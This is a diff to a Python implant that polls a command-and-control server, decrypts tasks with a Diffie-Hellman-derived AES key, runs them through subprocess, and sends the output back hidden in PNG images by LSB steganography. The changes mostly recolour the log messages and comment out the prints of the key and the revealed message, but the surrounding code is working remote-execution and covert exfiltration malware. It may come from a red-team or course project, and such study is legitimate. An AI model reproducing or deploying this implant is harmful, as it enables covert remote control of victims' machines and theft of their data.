@@ -6,6 +6,11 @@ import subprocess
 import time
 from diffiehellman import DiffieHellman
 
+GREEN = '\033[32m'
+RED = '\033[31m'
+STATUS = '\033[36m'
+RESET = '\033[0m'
+
 
 global_key = None
 
@@ -24,7 +29,8 @@ def encrypt(plain_str):
     cipher = AES.new(global_key, AES.MODE_CBC)
     plaintext = plain_str.encode() + (padding.to_bytes(1, "big") * padding)
     encrypted = cipher.encrypt(plaintext)
-    print(f"[*] Encrypted Message: {encrypted})")
+    #print(f"[*] Encrypted Message: {encrypted})")
+    print(f"{STATUS}[*]{RESET} Encrypted Message")
     return (encrypted + cipher.iv).decode("latin-1")
 
 #Decryption of data 
@@ -35,7 +41,7 @@ def decrypt(ciphertext):
     msg = ciphertext[:-16]
     plaintext = cipher.decrypt(msg)
     plaintext = plaintext[:-plaintext[len(plaintext)-1]]
-    print(f"[*] Unencrypted Message: {plaintext.decode()}")
+    print(f"{STATUS}[*]{RESET} Command: {plaintext.decode()}")
     return plaintext.decode() 
 
 #str is the encrypted string of data that needs to be hidden in a file. 
@@ -45,15 +51,15 @@ def mod_img(msg):
     encoded_img = lsb.hide(f"{path}{file_name}.png", msg) #we have to assume that we are in a writeable directory for this 
     encoded_img.save(f"{path}{file_name}-final.png")
     #Error Checking: 
-    print("[*] Revealed from image:")
-    print(lsb.reveal(f"{path}{file_name}-final.png"))
+    #print("[*] Revealed from image:")
+    #print(lsb.reveal(f"{path}{file_name}-final.png"))
     return f"{path}{file_name}-final.png" 
 
 #Execute command 
 def exec(cmd): 
     result = ""
     if cmd == "sleep 10":
-        print("[*] No commands. Sleeping...")
+        print(f"{STATUS}[*]{RESET} Sleeping...")
         time.sleep(10)
     else: 
         cmd_lst = cmd.split()
@@ -63,15 +69,15 @@ def exec(cmd):
             print(f"[+] Reading {cmd_lst[1]}")
             pass #needs to be implemented
         else: 
-            print("[+] Executing command: %s" % cmd)
+            print(f"{GREEN}[+]{RESET} Executing command: %s" % cmd)
             output = subprocess.run(cmd_lst, capture_output=True, text=True)
             result = output.stdout 
-            print("[+] Result: %s" % result)
+            print(f"{GREEN}[+]{RESET} Result: %s" % result)
     return result 
 
 #Sending output back to C2Server 
 def send_output(obf_img): 
-    print("[+] Sending image back to server...")
+    print(f"{GREEN}[+]{RESET} Sending image back to server...")
     requests.post(routes[1], files={"file": open(obf_img,'rb')})
     return
 
@@ -96,7 +102,8 @@ def key_dist():
 
     #deriving shared AES key
     global_key=dh.generate_shared_key(server_public_key)[:16]
-    print(f"[+] Derived AES key: {global_key}")
+    #print(f"[+] Derived AES key: {global_key}")
+    print(f"{GREEN}[+]{RESET} Derived AES key")
     return 
 
 
@@ -104,17 +111,17 @@ def key_dist():
 def init(): 
     tries = 0
     while tries < 3: 
-        print("[+] Contacting Server...")
+        print(f"{GREEN}[+]{RESET} Contacting Server...")
         try:
             response = requests.get(url)
-            print("[+] Connection Established...")
+            print(f"{GREEN}[+]{RESET} Connection Established...")
             print(response.text)
             key_dist()
             return
         except Exception as e: 
-            print("[-] Error in Contacting Server...")
+            print(f"{RED}[-]{RESET} Error in Contacting Server...")
             tries += 1
-    print("[-] Failure in establishing connection.")
+    print(f"{RED}[-]{RESET} Failure in establishing connection.")
     destroy()
     exit(1) #If reached, server cannot be contacted, and must exit
 
@@ -124,7 +131,7 @@ def parse_json(response):
     res_json = response.json()
     cmd = ""
     if res_json["task"] == None: 
-        print("[-] Error in parsing JSON.")
+        print(f"{RED}[-]{RESET} Error in parsing JSON.")
         cmd = "echo 0" #just doing this to handle error case 
     else:
         cmd = res_json["task"]
@@ -149,10 +156,11 @@ if __name__ == '__main__':
             num_tries = 1
         except Exception as e: 
             if num_tries > 3: 
-                print("[-] Lost contact with server. Exiting...")
+                print(f"{RED}[-]{RESET} Lost contact with server. Exiting...")
                 break
             else:
-                print(f"[*] Could not contact server. Re-try #{num_tries}...")
+                time.sleep(num_tries*15)
+                print(f"{RED}[-]{RESET} Could not contact server. Re-try #{num_tries}...")
                 num_tries += 1
     
 
